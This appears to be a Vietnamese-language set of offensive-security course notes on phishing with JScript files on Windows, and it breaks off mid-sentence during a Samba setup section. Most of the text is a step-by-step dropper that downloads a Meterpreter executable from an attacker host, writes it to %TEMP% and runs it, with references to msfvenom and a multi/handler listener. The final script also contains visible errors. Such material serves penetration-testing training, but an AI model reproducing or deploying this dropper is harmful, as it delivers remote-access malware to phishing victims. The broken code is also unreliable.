## Creating a Basic Dropper in JScript
JavaScript là ngôn ngữ thông dịch, được xử lý bên trong trình duyệt và thường kết hợp với HTML và CSS để tạo nên phần lớn nội dung trên World Wide Web. Chức năng của JavaScript dựa trên tiêu chuẩn ECMAScript.
JScript là một biến thể của Javascript do Microsoft phát triển và sở hữu, được sử dụng trong Internet Explorer. Ngoài ra, JScript cũng có thể được thực thi bên ngoài trình duyệt thông qua Windows Script Host, một thành phần có khả năng thực thi các tập lệnh viết bằng nhiều ngôn ngữ khác nhau.
Khi được thực thi bên ngoài trình duyệt web, JScript không chịu sự ràng buộc của các cơ chế bảo mật do sandbox của trình duyệt áp đặt. Điều này đồng nghĩa với việc chúng ta có thể sử dụng JScript như một vector thực thi mã phía client mà không cần khai thác bất kỳ lỗ hổng nào.
### Execution of Jscript on Windows
Để một loại tệp có thể được sử dụng trong một cuộc tấn công phishing, nó cần phải dễ dàng được thực thi. Vì lý do này, một số loại tệp phù hợp với các cuộc tấn công phishing hơn so với các loại tệp khác. Để minh hoạ điều này, chúng ta kiểm tra các tệp PowerShell và JScript trên máy victim, đồng thời quan sát cách Windows xử lý chúng.
Trong Windows, định dạng của một tệp được xác định thông qua phần mở rộng của tệp, chứ không dựa trên nội dung thực tế của nó. Ngoài ra, các phần mở rộng tệp thường được liên kết với các ứng dụng mặc định. Để xem các liên kết này, chúng ta có thể truy cập **Settings > Apps > Default apps**, cuộn xuống cuối trang và chọn **Choose default apps by file type**:
![[Screenshot 2026-06-22 at 00.19.57.png|center|border|650]]
Khi cuộn xuống danh sách, chúng ta nhận thấy rằng ứng dựng mặc định dành cho các tệp kịch bản PowerShell `.ps1` là Notepad. Điều này có nghĩa là nếu người dùng nhấp đúp vào một tệp PowerShell, tệp đó không được thực thi mà thay vào đó sẽ được mở trong Notepad để chỉnh sửa. Vì vậy, ngay cả khi có thể thuyết phục nạn nhân nhấp đúp vào một tệp PowerShell, tệp này cũng sẽ không được thực thi theo mặc định. 
Ngược lại, ứng dụng mặc định dành cho các tệp `.js` là Windows-Based Script Host. Điều này có nghĩa là nếu người dùng nhấp đúp vào một tệp `.js`, nội dung bên trong tệp sẽ được thực thi.
![[Screenshot 2026-06-22 at 00.26.00.png|center|border|650]]
Như đã đề cập trước đó, việc thực thi JScript bên ngoài ngữ cảnh của trình duyệt web cho phép bỏ qua toàn bộ các thiết lập bảo mật của trình duyệt. Điều này cho phép chúng ta tương tác với công nghệ ActiveX cũ hơn cũng như với chính các engine của Windows Script Hosts. 
Chúng ta có thể tận dụng ActiveX bằng cách gọi hàm khởi tạo `ActiveXObject` và cung cấp tên của đối tượng cần sử dụng. Sau đó, có thể sử dụng `WScript.Shell` để tương tác với Windows Script Host Shell nhằm thực thi các ứng dụng Windows bên ngoài. Ví dụ, chúng ta có thể khởi tạo một đối tượng Shell có tên là `shell` từ lớp `WScript.Shell` thông qua hàm khởi tạo `ActiveXObject`, sau đó chạy bằng lệnh `Run`:

```javascript
var shell = new ActiveXObject("WScript.Shell")
var res = shell.Run("cmd.exe")
```

Sau khi lưu đoạn mã trên vào một tệp có phần mở rộng `.js` và nhấp đúp vào tệp đó, tập lệnh sẽ được thực thi và khởi chạy Command Prompt. Bản thân Windows Script Host sẽ thoát ngay sau khi tệp JScript hoàn tất quá trình thực thi, vì vậy chúng ta sẽ không quan sát thấy tiến trình này trong Process Explorer.

![[Screenshot 2026-06-22 at 00.41.06.png|center|border|650]]

### JScript Meterpreter Dropper
Tiếp theo, chúng ta sẽ mở rộng việc sử dụng JScript để tạo một dropper có khả năng tải xuống một tệp thực thi Meterpreter từ máy chủ web Kali Linux và thực thi tệp đó. 
Trước tiên, chúng ta sử dụng `msfvenom` để tạo một tệp thực thi  Meterpreter reverse HTTPS 64-bit có tên `met.exe` và lưu tệp này vào thư mục web root trên kali. Đồng thời, chúng ta sẽ thiết lập một Metasploit `multi/handler` để tiếp nhận phiên kết nối trả về.
![[Screenshot 2026-06-22 at 01.01.22.png|center|border|650]]
Sau khi tệp thực thi đã được tạo và handler, chúng ta bắt đầu xây dựng mã dropper. Trước hết, ta sẽ thực hiện một yêu cầu HTTP GET đơn giản từ JScript.
Để làm điều đó, chúng ta có đối tượng `MSXML2.XMLHTTP`, vốn dựa trên Microsoft XML Core Services và bộ phân tích giao thức HTTP đi kèm. Đối tượng này cung cấp khả năng hỗ trợ giao thức phía máy client để giao tiếp với các máy chủ HTTP. Mặc dù không được tài liệu hoá chính thức, đối tượng này vẫn tồn tại trong tất cả các phiên bản Windows hiện đại.
Chúng ta có thể sử dụng phương thức `CreateObject` của Windows Script Host để khởi tạo đối tượng `MSXML2.XMLHTTP`, sau đó sử dụng các phương thức `Open` và `Send` để thực hiện một yêu cầu HTTP GET. Phương thức `Open` nhận ba đối số. Đối số đầu tiên là phương thức HTTP, trong trường hợp này là `GET`. Đối số thứ 2 là là URL, và đối số thứ 3 cho biết yêu cầu sẽ thực hiện hiện theo kiểu đồng bộ.
Tóm lại, trong đoạn mã này chúng ta sẽ sử dụng biển `url` để thiết lập URL của tệp thực thi Meterpreter. Sau đó, chúng ta tạo một đối tượng Windows Script `MSXML2.XMLHTTP` để gọi phương thức `Open` trên đối tượng này để chỉ định một yêu cầu GET cùng với URL tương ứng. Cuối cùng, ta gửi yêu cầu GET để tải tệp xuống.
```javascript
var url = "http://192.168.45.205/met.exe"
var Object = WScript.CreateObject('MSXML2.XMLHTTP');

Object.Open('GET', url, false);
Object.Send()
```
Sau khi gửi yêu cầu HTTP GET, chúng ta sẽ thực hiện hai thao tác. Thao tác đầu tiên xác định xem yêu cầu có thành công hay không. Điều này có thể thực hiện bằng cách kiểm tra thuộc tính `Status` của đối tượng `MSXML2.XMLHTTP` và so sánh nó với giá trị `200`, tức mã trạng HTTP OK. Ta sẽ sử dụng một câu lệnh `if`:

```javascript
if (Object.Status == 200)
{
}
```

Sau khi nhận được mã trạng thái thành công, chúng ta sẽ tạo một đối tượng `Stream` và sao chép phản hồi HTTP vào đối tượng này để xử lý tiếp. Đối tượng `Stream` được khởi tạo từ `ADODB.Stream` thông qua phương thức `CreateObject`.

```javascript
var Stream = WScript.CreateObject('ADODB.Stream')
```

Tiếp theo, chúng ta sẽ gọi phương thức `Open` trên đối tượng `Stream` và bắt đầu chỉnh sửa các thuộc tính của luồng dữ liệu. Trước hết, ta thiết lập thuộc tính `Type`, tương ứng với `adTypeBinary`, thành giá trị `1` để chỉ định rằng nội dung đang được xử lý là dữ liệu nhị phân.
Sau đó, chúng ta gọi phương thức `Write` để ghi `ResponseBody`, tức tệp thực thi Meterpreter, vào luồng dữ liệu.
Cuối cùng, ta đặt lại thuộc tính `Position` về `0` để yêu cầu `Stream` trỏ về phần nội dung.

```javascript
Stream.Open();
Stream.Type = 1 //adTypeBinary
Stream.Write(Object.ResponseBody);
Stream.Position = 0
```

Cho đến thời điểm này chúng ta đã gửi một yêu cầu GET để tải tệp `met.exe` và xác minh rằng yêu cầu đã thành công. Tiếp theo, chúng ta đã ghi nội dung vào luồng `ADODB`. Bây giờ, khi nội dung đã được lưu trữ trong đối tượng `Stream`, chúng ta cần tạo một tệp và ghi nội dung nhị phân vào tệp đó. 
Phương thức này nhận hai đối số, đối số thứ nhất là tên tệp, và đối số thứ 2 là tuỳ chọn lưu, tức `SaveOptionEnum`. Chúng ta sẽ đặt tên tệp là `met.exe` và đặt `SaveOptionEnum` thành `adSaveCreateOverWrite` với giá trị số là 2, nhằm buộc nó ghi đè tệp nếu nó đã tồn tại. Sau khi thực hiện thao tác `SaveToFile`, chúng ta cần đóng đối tượng `Stream` bằng phương thức `Close`.

```javascript
Stream.SaveToFile("met.exe", 2);
Stream.Close();
```

Ở bước cuối cùng chúng ta sẽ tái sử dụng Windows Script Host Shell để thực thi tệp Meterpreter vừa được ghi xuống hệ thống.

```javascript
var res = new ActiveXObject("WScript.Shell").Run("met.exe");
```

Mã JScript hoàn chỉnh dùng để tải xuống và thực thi Meterpreter shell được trình bày bên dưới:

```javascript
var url = "http://192.168.45.205/met.exe"
var Object = WScript.CreateObject('MSXML2.XMLHTTP');

Object.open('GET', url, false);
Object.send();

if (Object.Status == 200)
{
	var Stream = WScript.CreatObject('ADODB.Stream');
	var Shell = WScript.CreateObject("WScript.Shell");
	var tempPath = Shell.ExpandEnvironmentStrings("%TEMP%") + "\\met.exe";
	Stream.Open();
	Stream.Type = 1;
	Stream.Write(Object.ResponseBody');
	Stream.Position = 0;

	Stream.SaveToFile("tempPath", 2);
	Stream.Close();
}

Shell.Run(tempPath);
```
Sau khi lưu đoạn mã này dưới dạng một tệp `.js`, ta chỉ cần nhấp đúp vào tệp đó để nhận được một shell 64-bit từ máy nạn nhân kết nối về listener `multi/handler` đang chờ sẵn.
Cần lưu ý rằng JScript hỗ trợ cấu hình proxy thông qua phương thức `setProxy`.
![[Phishing with Jscript.png|center|border|650]]
## JScript and CSharp
Để nâng cao kỹ thuật triển khai với JScript và chạy payload hoàn toàn trong bộ nhớ, chúng ta sẽ tiếp tục gọi các Win32 API. Do hiện không có phương thức nào được biết đến để gọi trực tiếp các Win32 API từ JScript, thay vào đó chúng ta sẽ nhúng một C# assembly đã được biên dịch vào trong tệp JScript và thực thi nó. Cách tiếp cận này cung cấp cho chúng ta các khả năng tương tự PowerShell, bởi vì ta sẽ có quyền truy cập tương đương vào .NET Framework. Đây là một kỹ thuật mạnh mẽ, gần đây đã thu hút nhiều sự chú ý và ngày càng trở nên phổ biến.
### Introduction to Visual Studio
Visual Studio đã được cài đặt sẵn trên máy phát triển Windows 11. Tuy nhiên, khi máy được hoàn nguyên về trạng thái ban đầu, toàn bộ mã nguồn đã viết trước đó sẽ bị mất. Để giải quyết vấn đề này, chúng ta sẽ tạo một thư mục chia sẻ Samba trên Kali nhằm lưu trữ mã nguồn giữa các lần hoàn nguyên hệ thống.
Vì Samba đã được cài đặt sẵn trên Kali, chúng ta cần sao lưu cấu hình của nó tức `smb.conf`, sau đó tạo một tệp cấu hình mới như minh họa dưới đây:
```bash
sudo mv /etc/samba/smb.conf /etc/samba/smb.conf.old 

sudo nano /etc/samba/smb.conf
```

Chúng ta sẽ tạo một tệp cấu hình SMB đơn giản với nội dung như bên dưới. Nếu lựa chọn sử dụng một tài khoản người dùng khác, ta chỉ cần thay đổi biến đường dẫn `path` cho phù hợp:

```markdown
[visualstudio]
 path = /home/kali/data
 browseable = yes
 read only = no
```

Tiếp theo, chúng ta cần tạo một người dùng Samba có quyền truy cập vào thư mục chia sẻ, sau đó khởi động các dịch vụ cần thiết như được trình bày dưới đây:

```bash
duong@duong:~$ sudo mv /etc/samba/smb.conf /etc/samba/smb.conf.old
[sudo] password for duong: 

duong@duong:~$ sudo nano /etc/samba/smb.conf               

duong@duong:~$ sudo smbpasswd -a duong
New SMB password:
Retype new SMB password:
Added user duong.

duong@duong:~$ sudo systemctl start smbd

duong@duong:~$ sudo systemctl start nmbd
```
Cuối cùng, chúng ta sẽ tạo thư mục chia sẻ và mở quyền truy cập để Visual Studio có thể sử dụng thư mục này:

```bash
duong@duong:~$ mkdir /home/duong/data

duong@duong:~$ chmod -R 777 /home/duong/data 
```

Tiếp theo, chúng ta 